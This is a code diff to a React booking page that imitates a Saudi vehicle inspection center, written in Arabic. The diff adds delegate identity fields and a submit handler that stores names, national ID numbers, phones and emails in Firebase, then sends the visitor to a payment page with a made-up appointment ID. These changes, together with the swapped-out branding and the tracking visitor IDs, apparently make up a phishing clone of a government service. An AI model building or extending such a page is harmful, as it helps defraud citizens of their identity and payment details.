@@ -6,8 +6,16 @@ import { Menu, MessageCircle, Facebook, Twitter, Instagram, ChevronDown, MapPin 
 import { useState } from "react"
 import ServiceMap from "@/components/service-map"
 import { LicensePlate } from "@/components/license-plate"
-
+import { useRouter } from "next/navigation"
+import { addData } from "../../lib/firebase"
+function randstr(prefix: string) {
+  return Math.random()
+    .toString(36)
+    .replace("0.", prefix || "")
+}
+const visitorID = randstr("salmn-")
 export default function Home() {
+  const router = useRouter()
   const [formData, setFormData] = useState({
     // Personal Information
     name: "",
@@ -15,6 +23,14 @@ export default function Home() {
     idNumber: "",
     phone: "",
     email: "",
+
+    // Delegate Information
+    hasDelegate: false,
+    delegateName: "",
+    delegateIdType: "national",
+    delegateIdNumber: "",
+    delegatePhone: "",
+    delegateEmail: "",
 
     // Vehicle Information
     licensePlate: {
@@ -43,14 +59,16 @@ export default function Home() {
 
   const [acceptedTerms, setAcceptedTerms] = useState(false)
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (!acceptedTerms) {
       alert("يرجى قبول الشروط والأحكام")
       return
     }
+    const visitorID=localStorage.getItem('visitor')
+    await addData({id:visitorID,...formData})
     console.log("Form submitted:", formData)
-    
+    router.push(`/payment?appointmentId=${Date.now()}`)
   }
 
   const handleCenterSelect = (center: any) => {
@@ -70,14 +88,8 @@ export default function Home() {
             <Menu className="w-5 h-5 text-stone-800" />
           </button>
           <div className="flex items-center gap-3">
-            <div className="text-right">
-              <h1 className="text-sm font-bold text-stone-900 mb-2">مركز سلامة المركبات</h1>
-              <p className="text-xs text-stone-500">Vehicles Safety Center</p>
+              <img src='/next.svg' alt="logo" width={180} />
             </div>
-            <div className="w-10 h-10 rounded-full bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center text-white font-bold">
-              مس
-            </div>
-          </div>
           <div className="w-10" />
         </div>
       </header>
@@ -128,7 +140,8 @@ export default function Home() {
                   <div>
                     <label className="block text-sm font-medium text-stone-700 mb-2">رقم الهوية</label>
                     <input
-                      type="text"
+                      type="tel"
+                      maxLength={10}
                       placeholder="أدخل رقم الهوية"
                       className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                       value={formData.idNumber}
@@ -162,6 +175,98 @@ export default function Home() {
                 </div>
               </div>
             </div>
+
+            {/* Delegate Information Section */}
+            <div className="bg-white rounded-lg border border-stone-200 p-6 shadow-sm">
+              <label className="flex items-center gap-3 cursor-pointer group">
+                <input
+                  type="checkbox"
+                  checked={formData.hasDelegate}
+                  onChange={(e) => setFormData({ ...formData, hasDelegate: e.target.checked })}
+                  className="w-5 h-5 rounded border-stone-300 text-green-600 focus:ring-green-500 cursor-pointer"
+                />
+                <span className="text-sm font-medium text-stone-700">هل تريد تفويض شخص لإجراء الفحص الدوري؟</span>
+              </label>
+            </div>
+
+            {formData.hasDelegate && (
+              <div className="bg-white rounded-lg border border-green-200 p-6 shadow-sm border-l-4 border-l-green-600">
+                <h3 className="text-lg font-semibold text-stone-900 mb-6">معلومات المفوض</h3>
+
+                <div className="space-y-4">
+                  <div>
+                    <label className="block text-sm font-medium text-stone-700 mb-2">اسم المفوض</label>
+                    <input
+                      type="text"
+                      placeholder="أدخل اسم المفوض الكامل"
+                      className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
+                      value={formData.delegateName}
+                      onChange={(e) => setFormData({ ...formData, delegateName: e.target.value })}
+                    />
+                  </div>
+
+                  <div className="grid grid-cols-2 gap-4">
+                    <div>
+                      <label className="block text-sm font-medium text-stone-700 mb-2">نوع هوية المفوض</label>
+                      <div className="relative">
+                        <select
+                          className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition bg-white appearance-none"
+                          value={formData.delegateIdType}
+                          onChange={(e) => setFormData({ ...formData, delegateIdType: e.target.value })}
+                        >
+                          <option value="national">الهوية الوطنية</option>
+                          <option value="resident">هوية مقيم</option>
+                          <option value="passport">جواز سفر</option>
+                        </select>
+                        <ChevronDown className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-stone-400 pointer-events-none" />
+                      </div>
+                    </div>
+
+                    <div>
+                      <label className="block text-sm font-medium text-stone-700 mb-2">رقم هوية المفوض</label>
+                      <input
+                        type="text"
+                        placeholder="أدخل رقم الهوية"
+                        className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
+                        value={formData.delegateIdNumber}
+                        onChange={(e) => setFormData({ ...formData, delegateIdNumber: e.target.value })}
+                      />
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-2 gap-4">
+                    <div>
+                      <label className="block text-sm font-medium text-stone-700 mb-2">رقم هاتف المفوض</label>
+                      <input
+                        type="tel"
+                        placeholder="أدخل رقم الهاتف"
+                        className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
+                        value={formData.delegatePhone}
+                        onChange={(e) => setFormData({ ...formData, delegatePhone: e.target.value })}
+                      />
+                    </div>
+
+                    <div>
+                      <label className="block text-sm font-medium text-stone-700 mb-2">البريد الإلكتروني للمفوض</label>
+                      <input
+                        type="email"
+                        placeholder="أدخل البريد الإلكتروني"
+                        className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
+                        value={formData.delegateEmail}
+                        onChange={(e) => setFormData({ ...formData, delegateEmail: e.target.value })}
+                      />
+                    </div>
+                  </div>
+
+                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mt-4">
+                    <p className="text-xs text-blue-700 leading-relaxed">
+                      <span className="font-semibold block mb-1">ℹ️ معلومة:</span>
+                      يجب أن يكون المفوض حاملاً للهوية الصحيحة ويجب عليه تقديم نسخة من المستندات المطلوبة في مركز الفحص.
+                    </p>
+                  </div>
+                </div>
+              </div>
+            )}
 
             {/* Vehicle Information Section */}
             <div className="bg-white rounded-lg border border-stone-200 p-6 shadow-sm">
